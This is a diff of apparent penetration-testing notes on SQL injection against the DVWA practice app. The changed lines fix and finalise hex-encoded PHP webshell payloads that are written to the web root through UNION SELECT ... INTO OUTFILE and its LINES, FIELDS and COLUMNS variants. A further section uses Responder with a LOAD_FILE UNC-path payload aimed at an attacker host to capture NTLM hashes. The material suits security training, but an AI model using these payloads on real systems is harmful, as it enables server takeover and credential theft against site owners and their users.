@@ -126,7 +126,6 @@ Note: This step is necessary to find a destination to write a webshell.
 
 - Using SQL Query statements will disclose the PHP warning messages to find the absolute path of the web root directory.
 
-
 - When you execute the `LOAD_FILE()` function. Keep an eye out the php warning syntax messages. It'll provide you the absolute path to write php files.
 
 ```sql
@@ -211,45 +210,37 @@ Can't create/write to file '/var/www/shell.php' (Errcode: 13 "Permission denied"
 
 - You can of course encode it with hexadecimal
 
-```
-$ echo -n "<?php system(\$_GET[\'cmd\']); ?>" | hexdump -v -e '/1 "%02x"' | sed 's/^/0x/'
-0x3c3f7068702073797374656d28245f4745545b5c27636d645c275d293b203f3e
+```bash
+$ echo -n "<?php system(\$_GET['cmd']); ?>" | hexdump -v -e '/1 "%02x"' | sed 's/^/0x/'
+0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e
 ```
 
 ```sql
-' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b5c27636d645c275d293b203f3e, NULL INTO OUTFILE '/var/www/html/dvwa/shell.php'#
+' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e, NULL INTO OUTFILE '/var/www/html/dvwa/shell.php'#
 ```
 
 - Write a webshell via `LINES TERMINATED BY` SQL query.
 
-TODO: test this SQL query
-
 ```sql
-' UNION SELECT NULL, NULL INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3c3f7068702073797374656d28245f4745545b5c27636d645c275d293b203f3e#
+' UNION SELECT NULL, NULL INTO OUTFILE '/var/www/html/dvwa/shell.php' LINES TERMINATED BY 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e#
 ```
 
 - Write a webshell via `LINES STARTING BY` SQL query.
 
-TODO: test this SQL query
-
 ```sql
-' UNION SELECT NULL, NULL INTO OUTFILE '/var/www/html/shell.php' LINES STARTING BY 0x3c3f7068702073797374656d28245f4745545b5c27636d645c275d293b203f3e#
+' UNION SELECT NULL, NULL INTO OUTFILE '/var/www/html/dvwa/shell.php' LINES STARTING BY 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e#
 ```
 
 - Write a webshell via `FIELDS TERMINATED BY` SQL query.
 
-TODO: test this SQL query
-
 ```sql
-' UNION SELECT NULL, NULL INTO OUTFILE '/var/www/html/shell.php' FIELDS TERMINATED BY 0x3c3f7068702073797374656d28245f4745545b5c27636d645c275d293b203f3e#
+' UNION SELECT NULL, NULL INTO OUTFILE '/var/www/html/dvwa/shell.php' FIELDS TERMINATED BY 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e#
 ```
 
 - Write a webshell via `COLUMNS TERMINATED BY` SQL query.
 
-TODO: test this SQL query
-
 ```sql
-' UNION SELECT NULL, NULL INTO OUTFILE '/var/www/html/shell.php' COLUMNS TERMINATED BY 0x3c3f7068702073797374656d28245f4745545b5c27636d645c275d293b203f3e#
+' UNION SELECT NULL, NULL INTO OUTFILE '/var/www/html/dvwa/shell.php' COLUMNS TERMINATED BY 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e#
 ```
 
 ##### 4.2.5.1.2 - Uploader
@@ -380,9 +371,9 @@ http://dvwa.local/dvwa/eval_php.php?evaluate=if(file_put_contents('webshell.php'
 
 ##### 4.2.5.1.4 - NTLM Hashes (Out-of-band) via Authenticated SMB Relay
 
-TODO: Check the links in the references to check other ways to exploit UNC paths
+TODO: Check the links in the references to check other ways to exploit UNC paths.
 
-- Run [[Responder|Responder]] to grab the NTLM hashes
+- Run [[Responder|Responder]] to grab the NTLM hashes.
 
 ```sql
 ' UNION SELECT NULL, LOAD_FILE('\\\\<attacker_IP>\\snare.txt')#
